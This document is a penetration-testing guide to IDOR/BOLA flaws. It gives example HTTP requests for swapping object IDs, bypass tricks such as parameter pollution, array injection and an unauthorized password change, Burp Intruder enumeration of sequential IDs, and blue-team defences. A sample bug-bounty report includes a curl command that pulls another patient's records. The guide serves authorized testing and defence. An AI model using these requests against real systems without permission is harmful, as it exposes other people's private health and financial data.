# Insecure Direct Object Reference (IDOR) / BOLA

## When to Use
- When conducting rigorous Web Application or API penetration testing targeting heavily utilized, multi-tenant applications (e.g., SaaS platforms, banking portals, healthcare record systems).
- Upon discovering numerical, sequential, or predictable object identifiers (e.g., `user_id=1254`, `receipt_id=9881`) explicitly passed within the URL path, query string, or JSON POST body.
- To demonstrate severe horizontal privilege escalation, proving that User A can critically manipulate the sensitive financial or private healthcare data of User B.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying the Target Surface (The Identifier)

```http
# Concept: IDOR occurs fundamentally when an application takes user-supplied input to 
# directly retrieve a database object, but disastrously fails to verify if the requesting 
# user actually owns or has authorization to access that specific object.

# 1. Capture typical traffic utilizing Burp Suite explicitly tracking where identifiers exist.

# Example A: The URL Parameter
GET /api/v1/user/profile?user_id=45091 HTTP/1.1
Authorization: Bearer <USER_A_TOKEN>

# Example B: The JSON POST Body (Hidden logic)
POST /api/v1/payments/refund HTTP/1.1
Authorization: Bearer <USER_A_TOKEN>
{
    "transaction_id": 88412,
    "amount": 50.00
}

# Example C: RESTful URI Pathing
DELETE /api/v1/documents/invoice_339.pdf HTTP/1.1
Authorization: Bearer <USER_A_TOKEN>
```

### Phase 2: Vulnerability Validation (The Attack)

```http
# Concept: Attempting Horizontal Privilege Escalation. We manipulate the identifier 
# belonging to our own account to target an identifier we do not own, utilizing our standard 
# low-privileged token.

# 1. Create two distinct accounts on the platform:
# Account A (Attacker): user_id = 45091
# Account B (Victim): user_id = 45092 (Ensure you control Account B to verify the impact legally!)

# 2. Replay the HTTP request utilizing Account A's Session Token, but request Account B's ID.
GET /api/v1/user/profile?user_id=45092 HTTP/1.1
Authorization: Bearer <USER_A_TOKEN>

# 3. Analyze the Server's HTTP Response:
# Result A (Secure): HTTP 403 Forbidden or 401 Unauthorized. (The server checked authorization).
# Result B (Secure): HTTP 404 Not Found. (The server obfuscated the target effectively).
# Result C (VULNERABLE - IDOR): HTTP 200 OK
{
    "username": "victimUser22",
    "email": "victim_b@corporate.com",
    "ssn": "xxx-xx-1234",
    "credit_card": "4111-xxxx-xxxx-4444"
}
```

### Phase 3: Advanced IDOR Mechanics (Bypasses)

```http
# Concept: Developers occasionally attempt to insecurely patch IDOR. Circumvent naive filters.

# 1. Parameter Pollution (HPP):
# Supply the parameter twice. The WAF explicitly checks the first parameter (`user_id=45091`), 
# but the backend database implicitly executes querying the second parameter (`user_id=45092`).
GET /api/v1/profile?user_id=45091&user_id=45092

# 2. Array/JSON Injection:
# Transform an expected integer into a multi-value array within JSON.
{"user_id": [45091, 45092]}

# 3. Method Substitution (RESTful failures):
# A developer perfectly secured `GET /api/users/22` (Read access restricted), but carelessly 
# neglected to secure the modification endpoint.
POST /api/users/22/change_password 
{"new_password": "Hacked123!"}

# 4. Insecure GUID/UUID Predictability:
# If identifiers are universally unique IDs (UUIDs) like `123e4567-e89b-12d3...`, 
# brutal IDOR guessing is impossible. However, if the UUID is inadvertently leaked globally 
# within public forums, other API responses, or javascript variables, capture it and replay 
# it directly into the vulnerable endpoint parameter.
```

### Phase 4: Automation (Autorize / Burp Intruder)

```text
# Concept: Manually testing thousands of distinct IDs is tedious. Automate horizontally.

# 1. Burp Suite Intruder (Brute Forcing Sequential IDs):
# Send the `GET /api/documents/invoice_§331§` to Intruder.
# Payload: Numbers sequentially (300 to 400).
# Analyze the output explicitly searching for `HTTP 200 OK` exposing other organizations' invoices.

# 2. Autorize (Burp Extension):
# Provide Autorize the pristine authentication token for a highly privileged Admin user. 
# Browse the application utilizing a totally unauthenticated browser. 
# Autorize automatically replays every unauthenticated request inserting the Admin token, visually 
# charting precisely which endpoints insecurely leak data or execute actions bypassing role checks globally.
```

## 🔵 Blue Team Detection & Defense
- **Implement Robust Access Control Matrices**: IDOR cannot exist if authorization is intrinsically enforced mathematically on the backend architecture. Every single request fetching an object from the database MUST execute a conditional query: `SELECT * FROM invoices WHERE invoice_id = [Requested_ID] AND owner_user_id = [Current_Session_User_ID]`. If the session ID does not match the database owner ID explicitly, return empty securely.
- **Utilize Cryptographically Secure UUIDs**: Deprecate utilizing predictable, auto-incrementing integers (e.g., `user_id=1, 2, 3`) universally across all API development. Migrate entirely to UUIDv4 strings (e.g., `f47ac10b-58cc-4372-a567-0e02b2c3d479`). While UUIDs do not "fix" the lack of authorization directly, they fundamentally render blind horizontal iteration mathematically impossible for an attacker to guess, vastly reducing massive automated data exposure.
- **Indirect Object References**: Instead of utilizing actual database primary keys in public HTTP parameters, deploy cryptographic mapping dictionaries (Indirect References) stored exclusively within the user's active session state. Map `File A` to `Value 1`, `File C` to `Value 2`. The attacker requesting `Value 3` fails identically because the mapping exists uniquely tied to the authenticated session context.

## Key Concepts
| Concept | Description |
|---------|-------------|
| IDOR (Insecure Direct Object Reference) | A pervasive vulnerability classified under OWASP Broken Access Control. It occurs when an application provides direct access to objects utilizing developer-created identifiers explicitly without performing robust parameter-level authorization checks |
| BOLA (Broken Object Level Authorization) | The identical vulnerability natively terminology mapped under the OWASP API Security Top 10 (API1:2023) emphasizing its severe prevalence uniquely within REST/GraphQL stateless architectures |
| Horizontal Privilege Escalation | Expanding access to resources, files, or capabilities natively belonging to a separate user possessing the exact identical permission or role level (e.g., User A hacking User B) |
| UUID (Universally Unique Identifier) | A 128-bit algorithmic string practically guaranteeing uniqueness universally. Utilizing UUIDv4 essentially eliminates purely sequential parameter-guessing attacks |

## Output Format
```
Bug Bounty Submission: Critical IDOR in Healthcare Patient Records API
======================================================================
Vulnerability: Broken Object Level Authorization (BOLA)
Severity: Critical (CVSS 9.1) - Massive PII Exposure
Endpoint: `GET https://patient-portal.hospital.com/api/v2/records/{patient_id}/diagnostics`

Description:
A severe Broken Object Level Authorization vulnerability was discovered within the portal's primary diagnostic retrieval API architecture. 

When a standard, low-privileged patient successfully authenticates, the system assigns a JWT session token to authenticate requests. However, the application insecurely accepts the `{patient_id}` explicitly within the RESTful URL path, fundamentally utilizing this unvalidated integer to query the backend database directly.

An attacker simply capturing their legitimate request, for example: `GET /api/v2/records/55104/diagnostics`, and maliciously modifying the numeric identifier to `55105`, successfully circumvents all Access Control methodologies. 

The server replies unequivocally with a `200 OK` JSON document detailing highly confidential clinical test results, X-Ray links, and physician notes belonging exclusively to a completely disparate, unauthorized patient.

Reproduction Steps:
```bash
curl -i -s -k -X 'GET' \
    -H 'Authorization: Bearer my_attacker_jwt_token' \
    'https://patient-portal.hospital.com/api/v2/records/55105/diagnostics'
```

Impact:
Because the {patient_id} integers are sequential (Auto-incrementing Database Keys), an automated attacker leveraging Burp Suite Intruder could sequentially iterate from ID `1` to `99999` downloading the comprehensive Private Healthcare Information (PHI) of the entire hospital registry in under an hour, resulting in a devastating compliance catastrophe.
